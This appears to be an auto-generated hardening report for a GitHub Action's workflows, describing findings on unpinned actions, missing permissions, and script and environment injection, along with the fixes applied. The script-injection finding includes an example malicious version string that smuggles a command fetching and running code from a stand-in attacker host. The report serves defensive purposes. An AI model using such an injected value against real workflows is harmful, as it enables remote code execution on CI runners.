<!-- markdownlint-disable -->

# Hardening Report: Jumbo810--Upload_Github_Artifacts_TO_GDrive/v2.3.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **Jumbo810--Upload_Github_Artifacts_TO_GDrive/v2.3.3** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

All workflow files use mutable tag-based `uses:` references instead of pinned 40-character SHA commit hashes, making them vulnerable to supply-chain attacks if the referenced action tags are moved or compromised.

Failing references:
- ci.yml: `actions/checkout@v6`, `actions/setup-node@v6.1.0`, `actions/upload-artifact@v6`
- manual-release.yml: `actions/checkout@v6`, `actions/setup-node@v6.1.0`, `mindsers/changelog-reader-action@v2`, `softprops/action-gh-release@v2`
- release.yml: `actions/checkout@v6`, `actions/setup-node@v6.1.0`, `mindsers/changelog-reader-action@v2`, `softprops/action-gh-release@v2`
- test.yml: `actions/checkout@v6`, `actions/setup-node@v6.1.0`
- update-dist.yml: `actions/checkout@v6`, `actions/github-script@v8`, `mindsers/changelog-reader-action@v2`, `softprops/action-gh-release@v2`

Locations:

- `.github/workflows/ci.yml:27`
- `.github/workflows/manual-release.yml:14`
- `.github/workflows/release.yml:10`
- `.github/workflows/test.yml:14`
- `.github/workflows/update-dist.yml:14`

### permissions (severity: medium)

No workflow file has a top-level `permissions:` block, and no job within any workflow has a job-level `permissions:` block. This means all jobs run with the default (overly broad) GITHUB_TOKEN permissions. Every workflow should declare minimal required permissions explicitly.

Locations:

- `.github/workflows/ci.yml:1`
- `.github/workflows/manual-release.yml:1`
- `.github/workflows/release.yml:1`
- `.github/workflows/test.yml:1`
- `.github/workflows/update-dist.yml:1`

### script-injection (severity: high)

Direct `${{ }}` expression interpolation inside `run:` shell commands allows script injection. GitHub Actions substitutes these expressions into the shell script before execution, so an attacker-controlled value can inject arbitrary shell commands.

(a) `manual-release.yml` — `${{ inputs.version }}` is interpolated directly into multiple shell commands: a `git commit -m` message, `git tag`, `git push`, and `echo ... >> $GITHUB_OUTPUT`. A malicious version string (e.g. `v1.0; curl attacker.com | bash`) would execute arbitrary code.

(a) `update-dist.yml` — `${{ github.event.workflow_run.head_commit.message }}` is interpolated directly into a shell variable assignment: `COMMIT_MSG="${{ github.event.workflow_run.head_commit.message }}"`. The commit message is attacker-controlled (via a PR) and can contain shell metacharacters.

Locations:

- `.github/workflows/manual-release.yml:36`
- `.github/workflows/manual-release.yml:40`
- `.github/workflows/manual-release.yml:41`
- `.github/workflows/manual-release.yml:46`
- `.github/workflows/update-dist.yml:57`

### github-env-injection (severity: high)

Untrusted input values are written to special GitHub environment files (`$GITHUB_OUTPUT`, `$GITHUB_ENV`) without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`), enabling environment variable injection attacks.

(b) `manual-release.yml` line 46 — `echo "VERSION=${{ inputs.version }}" | sed 's/v//' >> $GITHUB_OUTPUT`: the `inputs.version` value (user-supplied via `workflow_dispatch`) is written directly to GITHUB_OUTPUT. A newline in the version string could inject additional key=value pairs into the output context.

(e) `update-dist.yml` line 57 — `COMMIT_MSG="${{ github.event.workflow_run.head_commit.message }}"` is used to derive `$VERSION`, which is then written as `echo "RELEASE_VERSION=$VERSION" >> $GITHUB_ENV` (line 64). The commit message is attacker-influenced and flows into GITHUB_ENV without sanitization, enabling environment injection.

Locations:

- `.github/workflows/manual-release.yml:46`
- `.github/workflows/update-dist.yml:64`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, permissions, script-injection, github-env-injection

**Notes:**

Fixed all five workflow files:

1. **unpinned-uses**: Pinned all 6 unique action references to full 40-char SHAs with tag comments: actions/checkout@df4cb1c, actions/setup-node@395ad32, actions/upload-artifact@b7c566a, actions/github-script@ed59741, mindsers/changelog-reader-action@1faaf50, softprops/action-gh-release@3bb1273.

2. **permissions**: Added top-level `permissions: {}` to all 5 workflows. Added job-level `permissions: { contents: read }` for lint/build/test jobs, and `permissions: { contents: write }` for jobs that push commits, tags, or create releases.

3. **script-injection**: Moved all `${{ }}` expressions out of `run:` shell strings into `env:` blocks. In manual-release.yml, `${{ inputs.version }}` → `INPUT_VERSION` env var. In update-dist.yml, `${{ github.event.workflow_run.head_commit.message }}` → `HEAD_COMMIT_MSG` env var. In test.yml, `${{ steps.test_upload.outcome }}` → `TEST_OUTCOME` env var.

4. **github-env-injection**: In manual-release.yml, sanitized `inputs.version` with `printf '%s' | tr -d '\n\r'` before writing to GITHUB_OUTPUT. In update-dist.yml, sanitized the extracted VERSION with `printf '%s' | tr -d '\n\r'` before writing to GITHUB_ENV.

